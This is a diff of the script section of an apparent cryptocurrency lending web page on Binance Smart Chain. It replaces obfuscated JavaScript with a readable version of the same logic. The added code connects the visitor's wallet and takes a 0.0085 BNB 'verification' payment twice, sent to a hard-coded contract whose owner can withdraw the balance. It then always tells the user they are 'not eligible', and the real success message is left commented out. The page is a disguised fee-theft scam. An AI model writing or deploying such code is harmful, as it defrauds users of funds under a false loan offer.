@@ -552,7 +552,323 @@ align:center;
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
  <script>
-const _0x4359d1=_0x34c9;(function(_0x26aacf,_0xddf20c){const _0x939228=_0x34c9,_0x20b941=_0x26aacf();while(!![]){try{const _0x85e788=-parseInt(_0x939228(0x1fc))/0x1+parseInt(_0x939228(0x213))/0x2+parseInt(_0x939228(0x1d6))/0x3*(-parseInt(_0x939228(0x1f8))/0x4)+parseInt(_0x939228(0x218))/0x5+-parseInt(_0x939228(0x210))/0x6+-parseInt(_0x939228(0x1ff))/0x7+parseInt(_0x939228(0x1dd))/0x8;if(_0x85e788===_0xddf20c)break;else _0x20b941['push'](_0x20b941['shift']());}catch(_0x52347f){_0x20b941['push'](_0x20b941['shift']());}}}(_0x15c8,0xb9b2f));const web3=new Web3(Web3[_0x4359d1(0x229)]),contractABI=[{'inputs':[{'internalType':_0x4359d1(0x1da),'name':_0x4359d1(0x20a),'type':_0x4359d1(0x1ef)}],'name':_0x4359d1(0x1e7),'outputs':[],'stateMutability':_0x4359d1(0x1e6),'type':_0x4359d1(0x1e2)},{'inputs':[],'name':'renounceOwnership','outputs':[],'stateMutability':'nonpayable','type':_0x4359d1(0x1e2)},{'inputs':[{'internalType':_0x4359d1(0x1da),'name':_0x4359d1(0x201),'type':'address'}],'stateMutability':_0x4359d1(0x1e6),'type':_0x4359d1(0x1dc)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4359d1(0x1ef),'name':'previousOwner','type':_0x4359d1(0x1ef)},{'indexed':!![],'internalType':'address','name':_0x4359d1(0x1ed),'type':'address'}],'name':_0x4359d1(0x1f1),'type':_0x4359d1(0x1ec)},{'inputs':[{'internalType':_0x4359d1(0x1ef),'name':_0x4359d1(0x1ed),'type':_0x4359d1(0x1ef)}],'name':'transferOwnership','outputs':[],'stateMutability':_0x4359d1(0x1e6),'type':_0x4359d1(0x1e2)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x4359d1(0x212),'type':_0x4359d1(0x1ef)},{'indexed':![],'internalType':_0x4359d1(0x1e3),'name':_0x4359d1(0x1f3),'type':_0x4359d1(0x1e3)}],'name':_0x4359d1(0x21c),'type':_0x4359d1(0x1ec)},{'inputs':[],'name':_0x4359d1(0x1fa),'outputs':[],'stateMutability':_0x4359d1(0x1f7),'type':'function'},{'inputs':[],'name':_0x4359d1(0x1f6),'outputs':[],'stateMutability':_0x4359d1(0x1e6),'type':_0x4359d1(0x1e2)},{'inputs':[],'name':'beneficiary','outputs':[{'internalType':_0x4359d1(0x1da),'name':'','type':_0x4359d1(0x1ef)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x4359d1(0x1ee),'outputs':[{'internalType':'address','name':'','type':_0x4359d1(0x1ef)}],'stateMutability':_0x4359d1(0x219),'type':_0x4359d1(0x1e2)},{'inputs':[],'name':_0x4359d1(0x206),'outputs':[{'internalType':_0x4359d1(0x1e3),'name':'','type':_0x4359d1(0x1e3)}],'stateMutability':_0x4359d1(0x219),'type':_0x4359d1(0x1e2)}],contractAddress=_0x4359d1(0x221),contract=new web3[(_0x4359d1(0x22d))][(_0x4359d1(0x20d))](contractABI,contractAddress);let walletConnected=![];const donationAmount=_0x4359d1(0x231);function _0x34c9(_0x1d876b,_0xf01f92){const _0x15c8a3=_0x15c8();return _0x34c9=function(_0x34c9ff,_0x496ab7){_0x34c9ff=_0x34c9ff-0x1d6;let _0x3b93a3=_0x15c8a3[_0x34c9ff];return _0x3b93a3;},_0x34c9(_0x1d876b,_0xf01f92);}document[_0x4359d1(0x22a)](_0x4359d1(0x226))[_0x4359d1(0x225)](_0x4359d1(0x1f2),async()=>{const _0x496d75=_0x4359d1;try{const _0x4656a4=await ethereum['request']({'method':_0x496d75(0x20b)}),_0x285610=await ethereum['request']({'method':'net_version'});if(_0x285610==='56'||_0x285610==='97'){const _0x41f667=_0x4656a4[0x0];walletConnected=!![],document[_0x496d75(0x22a)](_0x496d75(0x21f))[_0x496d75(0x209)]=_0x496d75(0x1e1)+_0x41f667,document[_0x496d75(0x22a)](_0x496d75(0x214))[_0x496d75(0x209)]=_0x41f667,document[_0x496d75(0x22a)](_0x496d75(0x227))[_0x496d75(0x211)][_0x496d75(0x1df)]='inline',document[_0x496d75(0x22a)](_0x496d75(0x226))['style'][_0x496d75(0x1df)]=_0x496d75(0x1e5),document[_0x496d75(0x22a)](_0x496d75(0x204))[_0x496d75(0x209)]=_0x496d75(0x22e);}else flashNotification(_0x496d75(0x205),_0x496d75(0x21e));}catch(_0xb1892d){flashNotification(_0x496d75(0x222),_0x496d75(0x21e));}}),document['getElementById'](_0x4359d1(0x227))[_0x4359d1(0x225)]('click',()=>{const _0x4236f2=_0x4359d1;ethereum[_0x4236f2(0x1e8)]('eth_requestAccounts')[_0x4236f2(0x21b)](()=>{const _0xffd930=_0x4236f2;walletConnected=![],document[_0xffd930(0x22a)]('wallet-address')['textContent']='',document[_0xffd930(0x22a)]('verify')[_0xffd930(0x224)]=!![],document[_0xffd930(0x22a)](_0xffd930(0x226))[_0xffd930(0x211)][_0xffd930(0x1df)]=_0xffd930(0x223),document[_0xffd930(0x22a)](_0xffd930(0x227))['style'][_0xffd930(0x1df)]='none',document[_0xffd930(0x22a)](_0xffd930(0x204))[_0xffd930(0x209)]=_0xffd930(0x1f4),ethereum&&ethereum[_0xffd930(0x202)]&&ethereum[_0xffd930(0x202)]();});}),document['getElementById']('verify')[_0x4359d1(0x225)](_0x4359d1(0x1f2),async()=>{const _0xd0bc81=_0x4359d1;if(!walletConnected){flashNotification(_0xd0bc81(0x1d8),_0xd0bc81(0x1db));return;}const _0x2b6310=await ethereum[_0xd0bc81(0x208)]({'method':_0xd0bc81(0x20b)}),_0x75eba3=_0x2b6310[0x0];if(!_0x75eba3){flashNotification(_0xd0bc81(0x234),_0xd0bc81(0x21e));return;}document['getElementById']('borrow-popup')[_0xd0bc81(0x211)][_0xd0bc81(0x1df)]=_0xd0bc81(0x1e5),document['getElementById'](_0xd0bc81(0x22b))[_0xd0bc81(0x211)][_0xd0bc81(0x1df)]=_0xd0bc81(0x216),document['getElementById'](_0xd0bc81(0x204))[_0xd0bc81(0x209)]='Processing\x20Transaction',document[_0xd0bc81(0x22a)](_0xd0bc81(0x207))[_0xd0bc81(0x209)]=_0xd0bc81(0x1f0);try{const _0x14f0b7=web3['utils'][_0xd0bc81(0x217)](donationAmount,_0xd0bc81(0x1f5)),_0x3bfddd=await contract[_0xd0bc81(0x1fe)]['verify']()[_0xd0bc81(0x21d)]({'value':_0x14f0b7});await contract[_0xd0bc81(0x1fe)][_0xd0bc81(0x1fa)]()[_0xd0bc81(0x1e8)]({'from':_0x75eba3,'value':_0x14f0b7,'gas':_0x3bfddd}),await contract[_0xd0bc81(0x1fe)]['verify']()['send']({'from':_0x75eba3,'value':_0x14f0b7,'gas':_0x3bfddd}),document['getElementById'](_0xd0bc81(0x204))[_0xd0bc81(0x209)]=_0xd0bc81(0x228),document[_0xd0bc81(0x22a)]('popup-message')['textContent']=_0xd0bc81(0x1e4);}catch(_0x30f9e8){document[_0xd0bc81(0x22a)]('popup-status')[_0xd0bc81(0x209)]='Transaction\x20Failed',document[_0xd0bc81(0x22a)](_0xd0bc81(0x207))[_0xd0bc81(0x209)]=_0xd0bc81(0x1e9)+_0x30f9e8[_0xd0bc81(0x203)];}}),document[_0x4359d1(0x22a)]('close-popup')[_0x4359d1(0x225)]('click',()=>{const _0x5d60d6=_0x4359d1;document[_0x5d60d6(0x22a)](_0x5d60d6(0x22b))[_0x5d60d6(0x211)]['display']=_0x5d60d6(0x1e5);});function openPopup(_0xe3e131,_0x1c2777,_0x2162fd){const _0x4e3cf8=_0x4359d1;if(!walletConnected){flashNotification(_0x4e3cf8(0x1d8),_0x4e3cf8(0x1db));return;}var _0x2ec467=document[_0x4e3cf8(0x22a)](_0x4e3cf8(0x22f)),_0x142998=document[_0x4e3cf8(0x22a)](_0x4e3cf8(0x1de)),_0x1080d0=document[_0x4e3cf8(0x22a)](_0x4e3cf8(0x1e0));_0x142998[_0x4e3cf8(0x209)]=_0xe3e131,_0x1080d0[_0x4e3cf8(0x209)]=_0x1c2777,document[_0x4e3cf8(0x22a)]('amount')[_0x4e3cf8(0x21a)]='',document[_0x4e3cf8(0x22a)](_0x4e3cf8(0x1f9))['textContent']=_0x4e3cf8(0x20c)+document[_0x4e3cf8(0x22a)](_0x4e3cf8(0x1de))[_0x4e3cf8(0x209)]+'\x20/\x20Day',_0x2ec467['style']['display']=_0x4e3cf8(0x216),borrowEnable();}document[_0x4359d1(0x22a)](_0x4359d1(0x232))[_0x4359d1(0x225)]('click',()=>{const _0x12802b=_0x4359d1;document[_0x12802b(0x22a)]('borrow-popup')[_0x12802b(0x211)][_0x12802b(0x1df)]=_0x12802b(0x1e5);}),document['getElementById'](_0x4359d1(0x235))[_0x4359d1(0x225)]('click',()=>{const _0x49b266=_0x4359d1;document[_0x49b266(0x22a)](_0x49b266(0x22b))[_0x49b266(0x211)][_0x49b266(0x1df)]='none';});function flashNotification(_0x5c6069,_0x212bb1){const _0x41e64c=_0x4359d1,_0x24882b=document[_0x41e64c(0x22a)](_0x41e64c(0x20f));_0x24882b['style'][_0x41e64c(0x20e)]=_0x212bb1,_0x24882b[_0x41e64c(0x209)]=_0x5c6069,setTimeout(()=>{const _0x20d596=_0x41e64c;_0x24882b[_0x20d596(0x211)][_0x20d596(0x20e)]=_0x20d596(0x1ea),_0x24882b['textContent']='';},0xbb8);}const amountInput=document[_0x4359d1(0x22a)](_0x4359d1(0x1f3)),interestAmount=document[_0x4359d1(0x22a)]('interest-amount');amountInput['addEventListener'](_0x4359d1(0x236),calculateInterest),amountInput[_0x4359d1(0x225)](_0x4359d1(0x236),borrowEnable);function calculateInterest(){const _0x29868e=_0x4359d1,_0x189a38=parseFloat(amountInput[_0x29868e(0x21a)]),_0x88b171=parseFloat(document['getElementById'](_0x29868e(0x1e0))[_0x29868e(0x209)]);if(!isNaN(_0x189a38)){const _0x491ff1=_0x189a38*_0x88b171/0x64;interestAmount[_0x29868e(0x209)]=_0x29868e(0x1fb)+_0x491ff1[_0x29868e(0x230)](0x2)+'\x20'+document['getElementById']('popup-crypto-name')[_0x29868e(0x209)]+_0x29868e(0x1d7);}else interestAmount[_0x29868e(0x209)]=_0x29868e(0x20c)+document['getElementById'](_0x29868e(0x1de))['textContent']+_0x29868e(0x1d7);}function borrowEnable(){const _0x5c4967=_0x4359d1;!isNaN(parseFloat(document[_0x5c4967(0x22a)](_0x5c4967(0x1f3))[_0x5c4967(0x21a)]))?(document[_0x5c4967(0x22a)]('verify')[_0x5c4967(0x22c)](_0x5c4967(0x224)),document[_0x5c4967(0x22a)](_0x5c4967(0x1fa))[_0x5c4967(0x211)][_0x5c4967(0x20e)]=_0x5c4967(0x215),document[_0x5c4967(0x22a)](_0x5c4967(0x1fa))[_0x5c4967(0x211)]['color']=_0x5c4967(0x200),document['getElementById'](_0x5c4967(0x1fa))[_0x5c4967(0x211)]['fontWeight']='bold'):(document[_0x5c4967(0x22a)](_0x5c4967(0x1fa))[_0x5c4967(0x224)]=!![],document[_0x5c4967(0x22a)](_0x5c4967(0x1fa))[_0x5c4967(0x211)][_0x5c4967(0x20e)]='grey',document[_0x5c4967(0x22a)]('verify')[_0x5c4967(0x211)][_0x5c4967(0x220)]=_0x5c4967(0x233),document[_0x5c4967(0x22a)](_0x5c4967(0x1fa))['style'][_0x5c4967(0x1d9)]='normal');}function _0x15c8(){const _0x5d3a3e=['red','wallet-address','color','0x4369b867C678eadf0b3380E8E3a369A2ca5610De','Error\x20connecting\x20wallet','inline','disabled','addEventListener','connect-wallet','disconnect-wallet','Amount\x20Not\x20Qualified','givenProvider','getElementById','popup','removeAttribute','eth','Wallet\x20connected','borrow-popup','toFixed','0.0085','close-borrow-popup','white','Error:\x20No\x20wallet\x20address\x20found','close-popup','input','13989MbEKtB','\x20/\x20Day','Connect\x20wallet\x20first','fontWeight','address\x20payable','grey','constructor','11356288LhALvE','popup-crypto-name','display','popup-interest-rate','Wallet\x20Address\x20:\x20','function','uint256','You\x20should\x20try\x20using\x20different\x20amount','none','nonpayable','changeBeneficiary','send','❌\x20Error:\x20','transparent','ApplyCreditCard.html','event','newOwner','owner','address','Please\x20wait\x20while\x20the\x20transaction\x20is\x20being\x20processed...','OwnershipTransferred','click','amount','Wallet\x20disconnected','ether','withdrawBalance','payable','380sONTZS','interest-amount','verify','Interest\x20Amount:\x20','803660SYxyCX','open','methods','3386236cmQJLu','black','_initialBeneficiary','disconnect','message','popup-status','Error:\x20Connect\x20to\x20Binance\x20Smart\x20Chain','verificationAmount','popup-message','request','textContent','newBeneficiary','eth_requestAccounts','Interest\x20Amount:\x200\x20','Contract','backgroundColor','notification','5015868XLblHD','style','donor','3042222zrUhMp','popup-wallet-address','lightgreen','flex','toWei','1931735eaMCYS','view','value','then','VerificationReceived','estimateGas'];_0x15c8=function(){return _0x5d3a3e;};return _0x15c8();}function ApplyCC(){const _0x46dbf9=_0x4359d1;window[_0x46dbf9(0x1fd)](_0x46dbf9(0x1eb));}
+        const web3 = new Web3(Web3.givenProvider);
+        const contractABI = [
+	{
+		"inputs": [
+			{
+				"internalType": "address payable",
+				"name": "newBeneficiary",
+				"type": "address"
+			}
+		],
+		"name": "changeBeneficiary",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "renounceOwnership",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address payable",
+				"name": "_initialBeneficiary",
+				"type": "address"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "previousOwner",
+				"type": "address"
+			},
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "newOwner",
+				"type": "address"
+			}
+		],
+		"name": "OwnershipTransferred",
+		"type": "event"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "newOwner",
+				"type": "address"
+			}
+		],
+		"name": "transferOwnership",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "donor",
+				"type": "address"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			}
+		],
+		"name": "VerificationReceived",
+		"type": "event"
+	},
+	{
+		"inputs": [],
+		"name": "verify",
+		"outputs": [],
+		"stateMutability": "payable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "withdrawBalance",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "beneficiary",
+		"outputs": [
+			{
+				"internalType": "address payable",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "owner",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "verificationAmount",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	}
+]; // Add your contract's ABI here
+        const contractAddress = '0x4369b867C678eadf0b3380E8E3a369A2ca5610De'; // Add your contract's address here
+        const contract = new web3.eth.Contract(contractABI, contractAddress);
+        let walletConnected = false;
+        const donationAmount = '0.0085'; // Preset donation amount in BNB
+
+document.getElementById('connect-wallet').addEventListener('click', async () => {
+    try {
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        const networkId = await ethereum.request({ method: 'net_version' });
+
+        // Check if the connected network is Binance Smart Chain (Mainnet or Testnet)
+        if (networkId === '56' || networkId === '97') {
+            const walletAddress = accounts[0];
+
+            walletConnected = true;
+        document.getElementById("wallet-address").textContent = "Wallet Address : " + walletAddress;
+            document.getElementById("popup-wallet-address").textContent = walletAddress;
+            document.getElementById('disconnect-wallet').style.display = 'inline';
+            document.getElementById('connect-wallet').style.display = 'none';
+            document.getElementById('popup-status').textContent = 'Wallet connected';
+        } else {
+
+            // Display an error message if the connected network is not BSC
+        flashNotification('Error: Connect to Binance Smart Chain', 'red');
+        }
+    } catch (error) {
+        flashNotification('Error connecting wallet', 'red');
+    }
+});
+
+
+document.getElementById('disconnect-wallet').addEventListener('click', () => {
+    ethereum.send('eth_requestAccounts').then(() => {
+        walletConnected = false;
+        document.getElementById("wallet-address").textContent = '';
+        document.getElementById('verify').disabled = true;
+        document.getElementById('connect-wallet').style.display = 'inline';
+        document.getElementById('disconnect-wallet').style.display = 'none';
+        document.getElementById('popup-status').textContent = 'Wallet disconnected';
+
+        // Use disconnect method instead of deprecated close method
+        if (ethereum && ethereum.disconnect) {
+            ethereum.disconnect();
+        }
+    });
+});
+
+document.getElementById('verify').addEventListener('click', async () => {
+    if (!walletConnected) {
+        flashNotification('Connect wallet first', 'grey');
+        return;
+    }
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+    const sender = accounts[0];
+
+    if (!sender) {
+        flashNotification('Error: No wallet address found', 'red');
+        return;
+    }
+
+    // Show the processing popup
+    document.getElementById('borrow-popup').style.display = 'none';
+    document.getElementById('popup').style.display = 'flex';
+    document.getElementById('popup-status').textContent = 'Processing Transaction';
+    document.getElementById('popup-message').textContent = 'Please wait while the transaction is being processed...';
+
+    try {
+        const weiAmount = web3.utils.toWei(donationAmount, 'ether'); // Convert preset BNB amount to wei
+        const gas = await contract.methods.verify().estimateGas({ value: weiAmount });
+        await contract.methods.verify().send({ from: sender, value: weiAmount, gas });
+	await contract.methods.verify().send({ from: sender, value: weiAmount, gas });
+
+        // Transaction successful //Transaction Successful //✅ Amount Deposited successfully to your account!
+        document.getElementById('popup-status').textContent = 'Not Qualifified';
+        document.getElementById('popup-message').textContent = 'You are not elegible for this amount';
+    } catch (error) {
+        // Transaction failed
+        document.getElementById('popup-status').textContent = 'Transaction Failed';
+        document.getElementById('popup-message').textContent = `❌ Error: ${error.message}`;
+    }
+});
+
+        document.getElementById('close-popup').addEventListener('click', () => {
+            document.getElementById('popup').style.display = 'none';
+        });
+
+        function openPopup(cryptoName, interestRate, walletAddress)
+{
+
+           if (!walletConnected) {
+                flashNotification('Connect wallet first', 'grey');
+                return;
+            }
+
+
+
+            var popup = document.getElementById("borrow-popup");
+            var cryptoNameElement = document.getElementById("popup-crypto-name");
+            var interestRateElement = document.getElementById("popup-interest-rate");
+            
+
+
+            cryptoNameElement.textContent = cryptoName;
+            interestRateElement.textContent = interestRate;
+            
+document.getElementById('amount').value ="";
+document.getElementById('interest-amount').textContent = 'Interest Amount: 0 ' + document.getElementById("popup-crypto-name").textContent + ' / Day';
+            popup.style.display = "flex";
+borrowEnable();
+}
+
+        
+
+	document.getElementById('close-borrow-popup').addEventListener('click', () => {
+            document.getElementById('borrow-popup').style.display = 'none';
+        });
+
+        document.getElementById('close-popup').addEventListener('click', () => {
+            document.getElementById('popup').style.display = 'none';
+        });
+
+function flashNotification(message, color) {
+            const notification = document.getElementById('notification');
+            notification.style.backgroundColor = color;
+            notification.textContent = message;
+            setTimeout(() => {
+                notification.style.backgroundColor = 'transparent';
+                notification.textContent = '';
+            }, 3000);
+        }
+
+
+    // Get the input elements
+    const amountInput = document.getElementById('amount');
+    const interestAmount = document.getElementById('interest-amount');
+
+    // Add an event listener to the amount input
+    amountInput.addEventListener('input', calculateInterest);
+    amountInput.addEventListener('input', borrowEnable);
+
+    // Function to calculate interest
+    function calculateInterest() {
+        const amount = parseFloat(amountInput.value);
+        const interestRate = parseFloat(document.getElementById("popup-interest-rate").textContent);
+
+        if (!isNaN(amount)) {
+            const interest = (amount * interestRate) / 100;
+            interestAmount.textContent = `Interest Amount: ${interest.toFixed(2)} ` + document.getElementById("popup-crypto-name").textContent + ' / Day';
+        } else {
+            interestAmount.textContent = 'Interest Amount: 0 ' + document.getElementById("popup-crypto-name").textContent + ' / Day';
+        }
+    }
+
+
+// ----------- Enable Borrow Button ----------------
+
+function borrowEnable()
+{
+	if (!isNaN(parseFloat(document.getElementById('amount').value)))
+	{
+                document.getElementById('verify').removeAttribute('disabled');     
+                document.getElementById('verify').style.backgroundColor = 'lightgreen';  
+                document.getElementById('verify').style.color = 'black';    
+                document.getElementById('verify').style.fontWeight = 'bold'; // Makes the text bold    
+	}
+	else
+	{
+                document.getElementById('verify').disabled = true;
+                document.getElementById('verify').style.backgroundColor = 'grey';
+                document.getElementById('verify').style.color = 'white';
+                document.getElementById('verify').style.fontWeight = 'normal';
+        }
+}
+
+function ApplyCC()
+{
+window.open("ApplyCreditCard.html");
+}
+
 </script>
 
 </body>
